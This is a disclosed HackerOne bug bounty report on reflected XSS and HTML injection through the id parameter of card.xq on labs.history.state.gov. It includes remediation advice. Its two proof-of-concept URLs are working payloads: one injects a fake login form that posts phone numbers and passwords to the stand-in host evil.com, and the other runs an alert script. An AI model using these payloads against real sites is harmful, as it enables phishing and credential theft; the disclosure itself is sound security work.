# xss and html injection on ( https://labs.history.state.gov)

## Report Details
- **Report ID**: 1810656
- **URL**: https://hackerone.com/reports/1810656
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-12-20T00:03:03.745Z
- **Disclosed**: 2023-02-20T02:00:01.044Z

## Reporter
- **Username**: iismailu
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: us-department-of-state

## Vulnerability Information
## Summary:
there's possible xss and html injection on your  website https://labs.history.state.gov    through /card.xq?id= parameter
because your web did not sanatize user input  and you have vulnerable  JavaScript libraries jQuery 1.11.3
 
## Steps To Reproduce:


  ## html injection P O C code
https://labs.history.state.gov/card.xq?id=%3C/title%3E%3Cbody%20style=%22background:%20green;%22%3E%3Cdiv%20class=%22container%22%3E%3Cform%20action=%22https://www.evil.com%22%20method=%22post%22%20class=%22form%22%20style=%22display:%20block;%22%3E%3Clabel%20for=%22pnumber%22%3Ephone%20number%20%3C/label%3E%3Cbr%3E%3Cinput%20type=%22tel%22%20name=%22pnumber%22%20id=%22pnumber%22%20value=%22%22%20placeholder=%22phone%20number%22%20maxlength=%2211%22inputmode=%22tel%22%20size=%2240px%22%3E%3Cbr%3E%3Clabel%20for=%22pword%22%3Epassword%3C/label%3E%3Cbr%3E%3Cinput%20type=%22password%22%20name=%22pword%22%20id=%22pword%22%20value=%22%22%20placeholder=%22password%22%20maxlength=%22200%22%20size=%2240px%22height=%22100px%22%3E%3Cbr%3E%3Cinput%20type=%22submit%22%20value=%22login%22%3E%3C/form%3E%3C/div%3E%3Cfont%20style=%22font-size:%20100px;color:%20red;%22%20class=%22welcome%22%3EWE%20ARE%20HACKERONE%3C/font%3E
  
  ## xss P O C code
https://labs.history.state.gov/card.xq?id=%3C/title%3E%3Cscript%3Ealert(document.domain)%3C/script%3E

##Remediation Guidance
1.   you have to sanitize user input before using it 
2.   update your  JavaScript libraries jQuery 1.11.3 
## Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]

  * [attachment / reference]

## Impact

1.. since html is a web language attacker can use this to change complete page look to do phishing attacks to compromise users
2.. attacker can use this to execute malicious javascript in user browser

## Attachments
- vokoscreenNG-2022-12-20_00-46-45.mkv
